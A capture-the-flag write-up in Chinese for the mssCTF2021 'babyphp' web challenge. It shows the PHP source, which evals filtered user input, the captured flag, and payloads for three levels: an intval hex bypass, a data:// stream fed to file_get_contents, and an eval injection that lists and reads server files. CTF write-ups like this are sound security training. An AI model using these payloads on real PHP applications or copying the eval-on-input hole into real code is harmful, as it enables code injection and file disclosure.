## mssCTF2021

## Quals Web

### <font color='orange'>babyphp</font>

+++

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

$mss1 = $_POST['level1'];
$mss2 = $_POST['level2'];
$mss3 = $_POST['level3'];

if (intval($mss1) < 2021 && intval($mss1 + 2) > 2022) {

    $mss4 = file_get_contents($mss2,'r');
    if ($mss4 === "mssCTF is interesting!") {
        
        if (!preg_match("/[0-9]|\`|\^|\\$|\*|\%|\~|\+|\{|\}|\'|\\\"|\,|\<|\>|\.|\/|\?/i", $mss3)) {
            echo "Regex is so wonderful!";
            echo "<br/>";
            eval($mss3);
        }

        else {
            echo "Success is near!";
            echo "<br/>";
        }
    }

    else {
        echo "Do you like PHP?";
        echo "<br/>";
    }
}

else {
    echo "Level1 is a babe trick,try again!";
    echo "<br/>";
}
Regex is so wonderful!
<?php
$flag = "xdsec{5619454e-16a4-425f-be7d-7b8ada9808b9}";
```

**level1**

当`intval`里的是一个字符串时直接返回0，所以第一个判断直接为0了
而第二个因为进行了加减，会先进行进制转换

所以构建一个十六进制的就可以
payload

```
level1=0x1011
```

**level2**

```php
$mss4 = file_get_contents($mss2,'r');
$mss4 === "mssCTF is interesting!"
```

$mss2是一个字符串，而`file_get_contents`需要的是一个文件，如果直接传**mssCTF is interesting!**会报错

所以需要**data://**协议，讲这句话转换为数据流，就可使`file_get_contents`正常运作

所以构造payload

```php
mss2=data://text/plain,mssCTF is interesting!
```

**level3**

这个就相对简单了，就是读取文件而已，过滤了一些字符，但问题不大

payload

```php
highlight_file(next(array_reverse(scandir(getcwd()))));
```















